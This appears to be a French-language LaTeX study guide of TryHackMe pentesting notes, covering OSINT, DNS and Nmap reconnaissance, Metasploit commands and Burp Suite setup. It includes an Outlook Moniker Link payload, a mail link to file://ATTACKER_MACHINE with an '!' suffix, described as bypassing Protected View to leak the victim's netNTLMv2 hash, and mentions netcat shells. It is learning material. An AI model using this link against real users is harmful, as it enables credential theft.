\\documentclass[12pt,a4paper]{report}
\\usepackage[utf8]{inputenc}
\\usepackage[french]{babel}
\\usepackage{bav4}
\\usepackage{listings}
\\usepackage{underscore}
\\usepackage{graphicx}

\\title{Guide TryHackMe - Techniques de Pentesting}
\\author{BAV4 Team}
\\date{\\today}

\\begin{document}

\\maketitle
\\tableofcontents
\\newpage

\\chapter{OSINT}

\\section{Google Dorking}

Le Google Dorking permet d'affiner les recherches Google pour trouver des informations sensibles :

\\begin{itemize}
    \\item \\monosp{site:google.com} : uniquement du site en question
    \\item \\monosp{inurl:admin} : contient "admin" dans l'URL
    \\item \\monosp{filetype:pdf} : fichiers pdf uniquement
    \\item \\monosp{intitle:admin} : pages avec "admin" dans leur titre
\\end{itemize}

\\section{Reconnaissance}

La reconnaissance (recon) est une enquÃªte prÃ©liminaire visant Ã  collecter des informations sur une cible. C'est la premiÃ¨re Ã©tape de la Kill Chain pour obtenir un premier accÃ¨s Ã  un systÃ¨me. La reconnaissance se divise en deux catÃ©gories :

\\subsection{Reconnaissance Passive}

La reconnaissance passive s'appuie sur des connaissances publiquement accessibles, sans engagement direct avec la cible. Elle permet de collecter des informations Ã  distance, sans laisser de traces sur les systÃ¨mes cibles.

\\textbf{ActivitÃ©s courantes :}
\\begin{itemize}
    \\item Consultation des enregistrements DNS depuis un serveur DNS public
    \\item Analyse des offres d'emploi liÃ©es Ã  la cible
    \\item Lecture d'articles de presse sur l'entreprise cible
    \\item Recherche d'informations WHOIS
\\end{itemize}

\\subsubsection{WHOIS}

WHOIS est un protocole de requÃªte-rÃ©ponse (RFC 3912) qui Ã©coute sur le port TCP 43. Le registrar de domaine maintient les enregistrements WHOIS pour les noms de domaine qu'il loue.

\\textbf{Informations obtenues :}
\\begin{itemize}
    \\item \\textbf{Registrar} : Via quel registrar le domaine a Ã©tÃ© enregistrÃ©
    \\item \\textbf{Informations de contact} : Nom, organisation, adresse, tÃ©lÃ©phone (sauf si service de confidentialitÃ© activÃ©)
    \\item \\textbf{Dates} : CrÃ©ation, derniÃ¨re mise Ã  jour, expiration
    \\item \\textbf{Name Servers} : Serveurs DNS Ã  interroger pour rÃ©soudre le domaine
\\end{itemize}

\\textbf{Utilisation :}

\\cmd{whois DOMAIN\\_NAME}

\\textbf{Note :} De nombreux services WHOIS redactent les emails pour Ã©viter le harvesting. Beaucoup d'organisations utilisent des services de confidentialitÃ© pour protÃ©ger leurs informations.

\\subsubsection{DNS Lookup}

Les outils de lookup DNS permettent d'obtenir les adresses IP et autres enregistrements DNS associÃ©s Ã  un domaine.

\\textbf{nslookup}

Outil de consultation de serveurs de noms (Name Server Look Up).

\\textbf{Syntaxe :}

\\cmd{nslookup OPTIONS DOMAIN\\_NAME SERVER}

\\textbf{ParamÃ¨tres :}
\\begin{itemize}
    \\item \\textbf{OPTIONS} : Type de requÃªte (A, AAAA, CNAME, MX, SOA, TXT)
    \\item \\textbf{DOMAIN\\_NAME} : Domaine Ã  interroger
    \\item \\textbf{SERVER} : Serveur DNS Ã  utiliser (1.1.1.1, 8.8.8.8, 9.9.9.9, etc.)
\\end{itemize}

\\textbf{Types de requÃªtes :}
\\begin{itemize}
    \\item \\textbf{A} : Adresses IPv4
    \\item \\textbf{AAAA} : Adresses IPv6
    \\item \\textbf{CNAME} : Canonical Name (alias)
    \\item \\textbf{MX} : Serveurs de messagerie
    \\item \\textbf{SOA} : Start of Authority
    \\item \\textbf{TXT} : Enregistrements texte
\\end{itemize}

\\textbf{Exemples :}

\\cmd{nslookup -type=A example.com 1.1.1.1}

\\cmd{nslookup -type=MX example.com}

\\textbf{dig}

Outil avancÃ© "Domain Information Groper" offrant plus de dÃ©tails que nslookup, notamment le TTL (Time To Live) par dÃ©faut.

\\textbf{Syntaxe :}

\\cmd{dig DOMAIN\\_NAME TYPE}

\\cmd{dig @SERVER DOMAIN\\_NAME TYPE}

\\textbf{Exemple :}

\\cmd{dig example.com MX}

\\cmd{dig @1.1.1.1 example.com A}

\\subsubsection{DÃ©couverte de Sous-domaines}

Les outils DNS standards (nslookup, dig) ne peuvent pas dÃ©couvrir automatiquement les sous-domaines. Les sous-domaines peuvent rÃ©vÃ©ler des informations cruciales et prÃ©senter des vulnÃ©rabilitÃ©s si mal maintenus.

\\textbf{DNSDumpster}

Service en ligne offrant des rÃ©ponses dÃ©taillÃ©es aux requÃªtes DNS et la dÃ©couverte de sous-domaines.

\\textbf{URL :} \\url{https://dnsdumpster.com/}

\\textbf{CapacitÃ©s :}
\\begin{itemize}
    \\item DÃ©couverte de sous-domaines non explicitement annoncÃ©s
    \\item RÃ©solution des noms de domaine vers adresses IP
    \\item GÃ©olocalisation des serveurs
    \\item Informations sur les serveurs DNS et MX
    \\item Visualisation graphique des donnÃ©es collectÃ©es
    \\item Enregistrements TXT
\\end{itemize}

\\textbf{Alternatives :}
\\begin{itemize}
    \\item Brute-forcing DNS avec wordlists
    \\item Utilisation de multiples moteurs de recherche
    \\item Outils automatisÃ©s (sublist3r, amass, etc.)
\\end{itemize}

\\subsubsection{Shodan.io}

Shodan.io est un moteur de recherche pour dispositifs connectÃ©s Ã  Internet. Contrairement aux moteurs de recherche traditionnels, Shodan indexe les services et dispositifs exposÃ©s en ligne.

\\textbf{URL :} \\url{https://www.shodan.io/}

\\textbf{Fonctionnement :}

Shodan tente de se connecter Ã  tous les dispositifs accessibles en ligne, collecte les informations des services actifs et les stocke dans une base de donnÃ©es consultable.

\\textbf{Informations obtenues :}
\\begin{itemize}
    \\item Adresses IP
    \\item HÃ©bergeur et localisation gÃ©ographique
    \\item Type et version de serveur
    \\item Services exposÃ©s et leurs configurations
    \\item BanniÃ¨res de services
    \\item Certificats SSL
\\end{itemize}

\\textbf{Utilisation :}

Recherche par nom de domaine, adresse IP, type de service, localisation, ou combinaison de filtres avancÃ©s.

\\textbf{Applications :}
\\begin{itemize}
    \\item \\textbf{Offensive} : Identifier les surfaces d'attaque sans engagement actif
    \\item \\textbf{DÃ©fensive} : DÃ©couvrir les dispositifs exposÃ©s de son organisation
    \\item \\textbf{Renseignement} : Cartographier l'infrastructure rÃ©seau d'une cible
\\end{itemize}

\\subsection{Reconnaissance Active}

La reconnaissance active nÃ©cessite un engagement direct avec la cible. Elle est plus intrusive et peut Ãªtre dÃ©tectÃ©e, nÃ©cessitant une autorisation lÃ©gale appropriÃ©e.

\\textbf{ActivitÃ©s courantes :}
\\begin{itemize}
    \\item Connexion aux serveurs de l'entreprise (HTTP, FTP, SMTP)
    \\item Scans de ports et de vulnÃ©rabilitÃ©s
    \\item IngÃ©nierie sociale (appels tÃ©lÃ©phoniques)
    \\item AccÃ¨s physique aux locaux (pretexting)
\\end{itemize}

\\textbf{Attention :} La nature invasive de la reconnaissance active peut rapidement mener Ã  des problÃ¨mes lÃ©gaux sans autorisation appropriÃ©e.

\\subsubsection{Navigateur Web}

Le navigateur web est un outil de reconnaissance pratique et discret. Les connexions apparaissent lÃ©gitimes parmi le trafic normal.

\\textbf{Extensions utiles :}
\\begin{itemize}
    \\item \\textbf{FoxyProxy} : Changement rapide de proxy (utile avec Burp Suite)
    \\item \\textbf{User-Agent Switcher and Manager} : Simulation de diffÃ©rents navigateurs/OS
    \\item \\textbf{Wappalyzer} : Identification des technologies utilisÃ©es par le site
\\end{itemize}

\\subsubsection{Ping}

VÃ©rifie si un systÃ¨me est en ligne via ICMP Echo (type 8) et Echo Reply (type 0).

\\cmd{ping -c COUNT HOSTNAME}

\\textbf{ParamÃ¨tres :} \\monosp{-c COUNT} (Linux), \\monosp{-n COUNT} (Windows)

\\textbf{VÃ©rifie :} SystÃ¨me en ligne, connectivitÃ© rÃ©seau, blocage firewall ICMP, latence rÃ©seau

\\subsubsection{Traceroute}

Identifie le chemin rÃ©seau et les routeurs intermÃ©diaires via manipulation du TTL.

\\cmd{traceroute HOSTNAME}

(Windows : \\monosp{tracert})

\\textbf{VÃ©rifie :} Nombre de hops, IPs des routeurs, latence par hop, routage dynamique

\\subsubsection{Telnet}

Banner grabbing sur n'importe quel service TCP. Port par dÃ©faut : \\textbf{TCP 23}. \\textbf{Attention :} transmission en clair.

\\cmd{telnet IP\\_ADDRESS PORT}

Puis envoyer les commandes du protocole (HTTP, SMTP, POP3, FTP).

\\textbf{VÃ©rifie :} Type et version du serveur, banniÃ¨res de services, headers de rÃ©ponse

\\subsubsection{Netcat (nc)}

Outil polyvalent TCP/UDP pour banner grabbing, shells et transferts.

\\cmd{nc IP\\_ADDRESS PORT}

\\textbf{ParamÃ¨tres :} \\monosp{-l -p PORT} (mode serveur), \\monosp{-u} (UDP), \\monosp{-e} (bind shell)

\\textbf{VÃ©rifie :} BanniÃ¨res de services, connectivitÃ© TCP/UDP, possibilitÃ© de reverse/bind shell

\\section{Network Scanning}

Phase cruciale pour cartographier la surface d'attaque et identifier les systÃ¨mes actifs.

\\subsection{Nmap}

Outil standard de cartographie rÃ©seau et d'audit de sÃ©curitÃ©.

\\textbf{Objectifs :} Identifier systÃ¨mes actifs, services, versions et OS.

\\subsubsection{SpÃ©cification de Cibles}

\\begin{itemize}
    \\item \\textbf{Liste/IP} : \\monosp{scanme.nmap.org 10.10.1.1}
    \\item \\textbf{Plage} : \\monosp{10.11.12.15-20}
    \\item \\textbf{CIDR} : \\monosp{10.10.1.0/24}
    \\item \\textbf{Fichier} : \\monosp{-iL list.txt}
\\end{itemize}

\\textbf{Preview :}

\\cmd{nmap -sL TARGETS}

\\subsubsection{DÃ©couverte d'HÃ´tes}

Identification des systÃ¨mes actifs avant scan de ports.

\\textbf{MÃ©thodes automatiques :}
\\begin{itemize}
    \\item \\textbf{PrivilÃ©giÃ© (Local)} : RequÃªtes ARP.
    \\item \\textbf{PrivilÃ©giÃ© (Distant)} : ICMP Echo, TCP ACK (80), TCP SYN (443), ICMP Timestamp.
    \\item \\textbf{Non-privilÃ©giÃ©} : TCP 3-way handshake (SYN) ports 80, 443.
\\end{itemize}

\\textbf{Ping Scan (Sans port scan) :}

\\cmd{nmap -sn TARGETS}

\\subsubsection{MÃ©thodes de Scan}

\\textbf{ARP Scan (Local)}

MÃ©thode la plus fiable sur rÃ©seau local. BasÃ©e sur les rÃ©ponses ARP.

\\rootcmd{nmap -PR -sn TARGET/24}

\\textbf{arp-scan (Alternative)}

Outil dÃ©diÃ© et rapide pour l'ARP scanning.

\\rootcmd{arp-scan -l}
\\rootcmd{arp-scan -I eth0 TARGET/24}

\\textbf{ICMP Scan}

Utilise le protocole ICMP. Souvent bloquÃ© par les firewalls (notamment Windows par dÃ©faut).

\\begin{itemize}
    \\item \\textbf{Echo (Type 8)} : \\rootcmd{nmap -PE -sn TARGET}
    \\item \\textbf{Timestamp (Type 13)} : \\rootcmd{nmap -PP -sn TARGET}
    \\item \\textbf{Mask (Type 17)} : \\rootcmd{nmap -PM -sn TARGET}
\\end{itemize}

\\textbf{TCP/UDP Ping}

Bypass potentiel de firewall en simulant des connexions services.

\\begin{itemize}
    \\item \\textbf{TCP SYN} : Envoie SYN. PrivilÃ©giÃ© (pas de handshake complet).
    \\rootcmd{nmap -PS80,443 TARGET}
    \\item \\textbf{TCP ACK} : Envoie ACK.
    \\rootcmd{nmap -PA80 TARGET}
    \\item \\textbf{UDP} : Envoie paquets UDP.
    \\rootcmd{nmap -PU TARGET}
\\end{itemize}

\\subsubsection{Options DNS}

\\begin{itemize}
    \\item \\textbf{Forcer rÃ©solution (mÃªme offline)} : \\cmd{nmap -R TARGET}
    \\item \\textbf{DÃ©sactiver rÃ©solution (Rapide)} : \\cmd{nmap -n TARGET}
    \\item \\textbf{Serveur DNS spÃ©cifique} : \\cmd{nmap --dns-servers 8.8.8.8 TARGET}
\\end{itemize}

\\subsubsection{Ã‰tats des Ports}

Nmap classe les ports en plusieurs Ã©tats :
\\begin{itemize}
    \\item \\textbf{Open} : Un service Ã©coute sur le port.
    \\item \\textbf{Closed} : Pas de service, mais le port rÃ©pond (accessible).
    \\item \\textbf{Filtered} : Le port n'est pas accessible (bloquÃ© par un pare-feu), Nmap ne peut dÃ©terminer s'il est ouvert ou fermÃ©.
\\end{itemize}

\\subsubsection{Techniques de Scan de Ports}

\\textbf{TCP Connect Scan (-sT)}

Effectue le 3-way handshake complet.
\\begin{itemize}
    \\item \\textbf{Utilisation} : Utilisateur non-privilÃ©giÃ©.
    \\item \\textbf{CaractÃ©ristiques} : Plus lent, plus facile Ã  dÃ©tecter (logs).
\\end{itemize}

\\cmd{nmap -sT TARGET}

\\textbf{TCP SYN Scan (-sS)}

Scan par dÃ©faut (si privilÃ¨ges). Ne termine pas la connexion (Half-open : SYN -> SYN/ACK -> RST).
\\begin{itemize}
    \\item \\textbf{Utilisation} : Root/Sudo requis.
    \\item \\textbf{CaractÃ©ristiques} : Rapide, furtif (souvent non loguÃ©).
\\end{itemize}

\\rootcmd{nmap -sS TARGET}

\\textbf{UDP Scan (-sU)}

Scan du protocole sans connexion UDP.
\\begin{itemize}
    \\item \\textbf{MÃ©canisme} : Port ouvert ne rÃ©pond gÃ©nÃ©ralement pas; port fermÃ© rÃ©pond ICMP Unreachable.
    \\item \\textbf{CaractÃ©ristiques} : Lent, souvent combinÃ© avec un scan TCP.
\\end{itemize}

\\rootcmd{nmap -sU TARGET}

\\subsubsection{SÃ©lection de Ports}

Par dÃ©faut, Nmap scanne les 1000 ports les plus courants.

\\begin{itemize}
    \\item \\textbf{Liste} : \\monosp{-p 22,80,443}
    \\item \\textbf{Plage} : \\monosp{-p 1-1023}
    \\item \\textbf{Tous les ports} : \\monosp{-p-} (scan les 65535 ports)
    \\item \\textbf{Mode Rapide} : \\monosp{-F} (100 ports les plus communs)
    \\item \\textbf{Top Ports} : \\monosp{--top-ports 10}
\\end{itemize}

\\subsubsection{Temporisation et Performance}

Le paramÃ¨tre \\monosp{-T<0-5>} contrÃ´le la vitesse du scan.

\\begin{itemize}
    \\item \\textbf{T0 - T1} : ParanoÃ¯aque/Furtif (Ã©vite IDS). TrÃ¨s lent.
    \\item \\textbf{T3} : Normal (dÃ©faut).
    \\item \\textbf{T4} : Agressif (recommandÃ© pour CTF/Apprentissage).
    \\item \\textbf{T5} : Insane (risque de perte de paquets).
\\end{itemize}

\\textbf{ContrÃ´le manuel :}
\\begin{itemize}
    \\item \\monosp{--min-rate / --max-rate <N>} : ContrÃ´le le nombre de paquets par seconde.
\\end{itemize}

\\subsection{Masscan}

Scanner asynchrone extrÃªmement rapide (millions de paquets/sec). Syntaxe proche de Nmap mais fonctionnalitÃ©s rÃ©duites. Attention Ã  la saturation rÃ©seau.


\\newpage
\\chapter{Pentesting}

\\section{Social Engineering}

\\subsection{Tools}

\\textbf{SET (Social-Engineer Toolkit)} : \\url{https://github.com/trustedsec/social-engineer-toolkit}

The Social-Engineer Toolkit est un framework open-source de test de pÃ©nÃ©tration conÃ§u pour l'ingÃ©nierie sociale. SET dispose d'un certain nombre de vecteurs d'attaque personnalisÃ©s qui permettent de crÃ©er rapidement une attaque crÃ©dible.

\\section{ByPass Technics}

\\subsection{Mails}

\\textbf{Outlook Moniker Links} : Les accÃ¨s Ã  des ressources externes par des liens par mail sont vÃ©rifiÃ©s par un SMB (Server Message Block) et protÃ©gÃ©s par la "Protected View" d'Outlook.

Exemple de lien pour appel Skype.

\\textbf{Bypass avec "!"} :

\\begin{codebox}{email.html}
\\begin{lstlisting}[language=HTML]
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
\\end{lstlisting}
\\end{codebox}

devient :

\\begin{codebox}{email-bypass.html}
\\begin{lstlisting}[language=HTML]
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
\\end{lstlisting}
\\end{codebox}

Et le PV (Protected View) ne voit rien !

\\textbf{MÃ©canisme d'attaque :}
\\begin{itemize}
    \\item MÃªme si ce partage n'existe pas rÃ©ellement, Windows va quand mÃªme tenter d'y accÃ©der automatiquement
    \\item Lors de cette tentative, l'ordinateur de la victime envoie une authentification pour essayer de se connecter
    \\item Cette authentification inclut le hash \\monosp{netNTLMv2} de la victime
\\end{itemize}

L'attaquant peut capturer ce hash et essayer de :
\\begin{itemize}
    \\item le cracker pour obtenir le mot de passe
    \\item ou l'utiliser dans un pass-the-hash attack
\\end{itemize}

Les Moniker Links s'appuient sur une technologie Windows appelÃ©e COM (Component Object Model). COM permet de charger des objets ou des composants depuis diverses sources, et dans certains cas, cela peut mener Ã  une exÃ©cution de code.

\\newpage
\\chapter{Tools}

\\section{Metasploit}

Les principaux composants du Metasploit Framework peuvent Ãªtre rÃ©sumÃ©s comme suit :

\\begin{itemize}
    \\item \\textbf{msfconsole} : L'interface en ligne de commande principale
    \\item \\textbf{Modules} : modules de support tels que exploits, scanners, payloads, etc.
    \\item \\textbf{Tools} : outils autonomes pour la recherche de vulnÃ©rabilitÃ©s, l'Ã©valuation des vulnÃ©rabilitÃ©s ou les tests de pÃ©nÃ©tration
\\end{itemize}

\\subsection{Payloads}

Les payloads sont des codes qui s'exÃ©cuteront sur le systÃ¨me cible :

\\begin{itemize}
    \\item \\textbf{Adapters} : Un adapteur enveloppe les payloads simples pour les convertir en diffÃ©rents formats (ex: adaptateur Powershell)
    \\item \\textbf{Singles} : Payloads autonomes (ajouter un utilisateur, lancer notepad.exe, etc.) qui n'ont pas besoin de tÃ©lÃ©charger un composant supplÃ©mentaire
    \\item \\textbf{Stagers} : Responsables de l'Ã©tablissement d'un canal de connexion entre Metasploit et le systÃ¨me cible
    \\item \\textbf{Stages} : TÃ©lÃ©chargÃ©s par le stager, permettent d'utiliser des payloads de plus grande taille
\\end{itemize}

\\textbf{Identification des payloads :}

\\begin{itemize}
    \\item \\monosp{generic/shell\\_reverse\\_tcp} : payload inline (single), indiquÃ© par le "\\_" entre "shell" et "reverse"
    \\item \\monosp{windows/x64/shell/reverse\\_tcp} : payload staged, indiquÃ© par le "/" entre "shell" et "reverse"
\\end{itemize}

\\subsection{Commandes}

\\textbf{use} : Entrer dans un contexte de travail

\\cmd{use exploit/windows/smb/ms017\\_00...}

Le contexte de travail nÃ©cessite des paramÃ¨tres :
\\begin{itemize}
    \\item \\monosp{set NOM\\_PARAMETRE VALUE} : dÃ©finir un paramÃ¨tre (juste pour le module)
    \\item \\monosp{unset} ou \\monosp{unset all} : supprimer un/tous les paramÃ¨tres
    \\item \\monosp{setg} et \\monosp{unsetg} : dÃ©finir/supprimer un paramÃ¨tre pour tous les modules
\\end{itemize}

Une fois tout configurÃ© :

\\cmd{run}

ou

\\cmd{exploit -z}

(l'option \\monosp{-z} pour passer en arriÃ¨re-plan)

\\textbf{Gestion des sessions :}

\\cmd{sessions}

Utiliser une session ouverte :

\\cmd{sessions -i 2}

\\textbf{ParamÃ¨tres les plus courants :}

\\begin{itemize}
    \\item \\textbf{RHOSTS} : "Remote host", l'adresse IP du systÃ¨me cible (supporte CIDR : /24, /16, etc.)
    \\item \\textbf{RPORT} : "Remote port", le port sur le systÃ¨me cible
    \\item \\textbf{PAYLOAD} : Le payload utilisÃ© avec l'exploit
    \\item \\textbf{LHOST} : "Localhost", l'adresse IP de la machine attaquante
    \\item \\textbf{LPORT} : "Local port", le port pour le reverse shell
    \\item \\textbf{SESSION} : ID de session de chaque connexion Ã©tablie
\\end{itemize}

\\textbf{Autres commandes utiles :}

\\cmd{info}

Donne toutes les infos relatives au contexte.

\\cmd{back}

Sortir du contexte.

\\cmd{show payloads}

Liste les payloads disponibles.

\\textbf{Recherche :}

\\cmd{search type:auxiliary telnet}

\\cmd{search ms17-010}

\\textit{Tips :} Si plusieurs modules sont listÃ©s avec des numÃ©ros, vous pouvez utiliser directement \\monosp{use 3} au lieu de taper le nom complet.

\\newpage
\\chapter{Burp Suite}

\\section{Introduction}

Burp Suite est un framework basÃ© sur Java conÃ§u comme solution complÃ¨te pour effectuer des tests de pÃ©nÃ©tration d'applications web. C'est devenu l'outil standard de l'industrie pour les Ã©valuations de sÃ©curitÃ© manuelles des applications web et mobiles, y compris celles qui reposent sur des APIs.

\\subsection{Principe de Fonctionnement}

Burp Suite capture et permet la manipulation de tout le trafic HTTP/HTTPS entre un navigateur et un serveur web. Cette capacitÃ© fondamentale forme l'Ã©pine dorsale du framework.

En interceptant les requÃªtes, les utilisateurs ont la flexibilitÃ© de les router vers diffÃ©rents composants du framework. La capacitÃ© d'intercepter, visualiser et modifier les requÃªtes web avant qu'elles n'atteignent le serveur cible, ou mÃªme manipuler les rÃ©ponses avant qu'elles ne soient reÃ§ues par le navigateur, fait de Burp Suite un outil inestimable pour les tests manuels d'applications web.

\\subsection{Ã‰ditions}

\\textbf{Burp Suite Community} : Version gratuite pour usage non-commercial. Fournit les fonctionnalitÃ©s de base suffisantes pour la majoritÃ© des tests manuels.

\\textbf{Burp Suite Professional} : Version complÃ¨te avec fonctionnalitÃ©s avancÃ©es :
\\begin{itemize}
    \\item Scanner automatique de vulnÃ©rabilitÃ©s
    \\item Fuzzer/brute-forcer sans limitation de vitesse
    \\item Sauvegarde de projets et gÃ©nÃ©ration de rapports
    \\item API intÃ©grÃ©e pour intÃ©gration avec d'autres outils
    \\item AccÃ¨s illimitÃ© aux extensions
    \\item AccÃ¨s au Burp Suite Collaborator (request catcher)
\\end{itemize}

\\textbf{Burp Suite Enterprise} : UtilisÃ© principalement pour le scan continu. Scanner automatique qui analyse pÃ©riodiquement les applications web pour dÃ©tecter les vulnÃ©rabilitÃ©s, similaire aux outils comme Nessus. RÃ©side sur un serveur plutÃ´t que sur une machine locale.

\\subsection{Composants Principaux}

\\textbf{Proxy} : Aspect le plus renommÃ© de Burp Suite. Permet l'interception et la modification des requÃªtes et rÃ©ponses lors de l'interaction avec les applications web.

\\textbf{Repeater} : Permet de capturer, modifier et renvoyer la mÃªme requÃªte plusieurs fois. ParticuliÃ¨rement utile pour crÃ©er des payloads par essai-erreur (ex: SQLi) ou tester la fonctionnalitÃ© d'un endpoint.

\\textbf{Intruder} : Permet de bombarder des endpoints avec des requÃªtes. Couramment utilisÃ© pour les attaques de brute-force ou le fuzzing. (LimitÃ© en vitesse dans Community)

\\textbf{Decoder} : Service de transformation de donnÃ©es. Peut dÃ©coder les informations capturÃ©es ou encoder des payloads avant de les envoyer Ã  la cible.

\\textbf{Comparer} : Permet la comparaison de deux ensembles de donnÃ©es au niveau des mots ou des octets. La possibilitÃ© d'envoyer directement des segments de donnÃ©es potentiellement larges vers un outil de comparaison avec un simple raccourci clavier accÃ©lÃ¨re considÃ©rablement le processus.

\\textbf{Sequencer} : GÃ©nÃ©ralement utilisÃ© pour Ã©valuer l'alÃ©atoire des tokens, comme les valeurs de cookies de session ou autres donnÃ©es supposÃ©ment gÃ©nÃ©rÃ©es alÃ©atoirement.

\\subsection{Extensions}

La base de code Java de Burp Suite facilite le dÃ©veloppement d'extensions pour amÃ©liorer les fonctionnalitÃ©s du framework :

\\begin{itemize}
    \\item Extensions en Java, Python (Jython) ou Ruby (JRuby)
    \\item Module Extender pour chargement rapide
    \\item BApp Store : marketplace pour tÃ©lÃ©charger des modules tiers
    \\item Exemple : Logger++ pour Ã©tendre la fonctionnalitÃ© de logging
\\end{itemize}

\\section{Installation et Configuration}

\\subsection{Installation}

\\textbf{TÃ©lÃ©chargement} : \\url{https://portswigger.net/burp/communitydownload}

\\textbf{Kali Linux} : Burp Suite est prÃ©-installÃ©. Si absent :

\\cmd{sudo apt install burpsuite}

\\textbf{Windows/Linux/macOS} : Installer via l'exÃ©cutable/script tÃ©lÃ©chargÃ© depuis le site officiel. Sur Linux sans sudo, l'installation se fait dans \\monosp{\\textasciitilde/BurpSuiteCommunity/}.

\\subsection{Premier Lancement}

\\textbf{1) Lancement}

Accepter les termes et conditions.

\\textbf{2) Type de Projet}

Dans Burp Suite Community, les options sont limitÃ©es. Cliquer sur \\textbf{Next}.

\\textbf{3) Configuration}

Garder les paramÃ¨tres par dÃ©faut dans la plupart des cas. Cliquer sur \\textbf{Start Burp}.

\\subsection{Dashboard}

Le Dashboard est divisÃ© en quatre quadrants :

\\textbf{Tasks} : Permet de dÃ©finir les tÃ¢ches en arriÃ¨re-plan. Par dÃ©faut, "Live Passive Crawl" enregistre automatiquement les pages visitÃ©es.

\\textbf{Event log} : Fournit des informations sur les actions effectuÃ©es par Burp Suite (dÃ©marrage du proxy, dÃ©tails des connexions).

\\textbf{Issue Activity} : (Professional uniquement) Affiche les vulnÃ©rabilitÃ©s identifiÃ©es par le scanner automatique, classÃ©es par gravitÃ©.

\\textbf{Advisory} : (Professional uniquement) Informations dÃ©taillÃ©es sur les vulnÃ©rabilitÃ©s identifiÃ©es, avec rÃ©fÃ©rences et remÃ©diations suggÃ©rÃ©es.

\\textbf{Note :} Les icÃ´nes de point d'interrogation ouvrent des fenÃªtres d'aide contextuelle pour chaque section.

\\subsection{Navigation}

\\textbf{Barre de menu principale} : SÃ©lection des modules (Proxy, Repeater, Intruder, etc.)

\\textbf{Barre secondaire} : Sous-onglets du module sÃ©lectionnÃ© (ex: Proxy Intercept, Proxy HTTP history)

\\textbf{DÃ©tacher les onglets} : Menu \\textit{Window} > \\textit{Detach} pour ouvrir un onglet dans une fenÃªtre sÃ©parÃ©e

\\textbf{Raccourcis clavier par dÃ©faut :}

\\begin{itemize}
    \\item \\monosp{Ctrl + Shift + D} : Dashboard
    \\item \\monosp{Ctrl + Shift + T} : Target
    \\item \\monosp{Ctrl + Shift + P} : Proxy
    \\item \\monosp{Ctrl + Shift + I} : Intruder
    \\item \\monosp{Ctrl + Shift + R} : Repeater
\\end{itemize}

\\subsection{ParamÃ¨tres}

Deux types de paramÃ¨tres :

\\textbf{User settings (Global)} : Affectent toute l'installation Burp Suite, appliquÃ©s Ã  chaque dÃ©marrage

\\textbf{Project settings} : SpÃ©cifiques au projet actuel. Non sauvegardÃ©s dans Community Edition

\\textbf{AccÃ¨s :} Bouton \\textbf{Settings} dans la barre de navigation supÃ©rieure

\\textbf{Menu gauche :}
\\begin{itemize}
    \\item Search : Recherche de paramÃ¨tres par mots-clÃ©s
    \\item Type filter : Filtrer User/Project settings
    \\item Categories : SÃ©lection par catÃ©gorie
\\end{itemize}

\\subsection{Configuration du Proxy Navigateur}

Pour utiliser Burp Suite, il faut configurer le navigateur pour rediriger le trafic :

\\textbf{1) Installer FoxyProxy} (Firefox)

Extension FoxyProxy Basic (dÃ©jÃ  installÃ© sur AttackBox)

\\textbf{2) Configurer Burp Proxy}

Cliquer sur l'icÃ´ne FoxyProxy > \\textit{Options} > \\textit{Add}

\\textbf{ParamÃ¨tres :}
\\begin{itemize}
    \\item Title : Burp
    \\item Proxy IP : \\ip{127.0.0.1}
    \\item Port : \\ipport{8080}
\\end{itemize}

\\textbf{3) Activer}

Cliquer sur FoxyProxy et sÃ©lectionner la configuration Burp

\\textbf{4) Tester}

\\begin{itemize}
    \\item S'assurer que \\textit{Intercept is on} dans l'onglet Proxy de Burp Suite
    \\item Visiter une page web
    \\item La requÃªte HTTP apparaÃ®tra dans Burp Suite
    \\item Le navigateur se figera jusqu'Ã  ce que la requÃªte soit forwarded ou dropped
\\end{itemize}

\\textbf{Attention :} Ne pas oublier de dÃ©sactiver l'interception quand elle n'est pas nÃ©cessaire !

\\section{Target}

L'onglet Target fournit plus que le simple contrÃ´le de la portÃ©e des tests. Il se compose de trois sous-onglets :

\\subsection{Site Map}

Permet de cartographier les applications web ciblÃ©es dans une structure arborescente. Chaque page visitÃ©e avec le proxy actif sera affichÃ©e sur la site map.

\\textbf{Utilisation :}
\\begin{itemize}
    \\item GÃ©nÃ©ration automatique en naviguant simplement sur l'application web
    \\item (Professional uniquement) Crawling automatisÃ© de la cible
    \\item ParticuliÃ¨rement utile pour cartographier les APIs
    \\item Tous les endpoints API accÃ©dÃ©s seront capturÃ©s
\\end{itemize}

\\subsection{Issue Definitions}

Liste exhaustive de toutes les vulnÃ©rabilitÃ©s que le scanner recherche (Professional). MÃªme dans Community, cette liste reste accessible comme rÃ©fÃ©rence :

\\begin{itemize}
    \\item Descriptions complÃ¨tes des vulnÃ©rabilitÃ©s web
    \\item RÃ©fÃ©rences et ressources
    \\item Utile pour la documentation dans les rapports
    \\item Aide Ã  la description des vulnÃ©rabilitÃ©s identifiÃ©es manuellement
\\end{itemize}

\\subsection{Scope Settings}

Permet de contrÃ´ler la portÃ©e cible dans Burp Suite :

\\begin{itemize}
    \\item Inclure ou exclure des domaines/IPs spÃ©cifiques
    \\item DÃ©finir la portÃ©e des tests
    \\item Se concentrer sur les applications web spÃ©cifiquement ciblÃ©es
    \\item Ã‰viter de capturer du trafic inutile
\\end{itemize}

\\section{Burp Proxy}

Le Burp Proxy est un outil fondamental et crucial dans Burp Suite. Il permet la capture des requÃªtes et rÃ©ponses entre l'utilisateur et le serveur web cible.

\\subsection{Points ClÃ©s}

\\textbf{Interception des RequÃªtes} : Quand les requÃªtes sont faites via le Burp Proxy, elles sont interceptÃ©es et retenues avant d'atteindre le serveur cible. Les requÃªtes apparaissent dans l'onglet Proxy, permettant :

\\begin{itemize}
    \\item Forward : envoyer la requÃªte
    \\item Drop : abandonner la requÃªte
    \\item Edit : modifier la requÃªte
    \\item Send to : envoyer vers d'autres modules Burp
\\end{itemize}

Pour dÃ©sactiver l'interception : cliquer sur \\textit{Intercept is on}

\\textbf{ContrÃ´le Total} : La capacitÃ© d'intercepter les requÃªtes donne aux testeurs un contrÃ´le complet sur le trafic web, ce qui est inestimable pour tester les applications web.

\\textbf{Capture et Logging} : Burp Suite capture et enregistre les requÃªtes faites via le proxy par dÃ©faut, mÃªme quand l'interception est dÃ©sactivÃ©e. Utile pour analyse ultÃ©rieure.

\\textbf{Support WebSocket} : Burp Suite capture et enregistre Ã©galement la communication WebSocket.

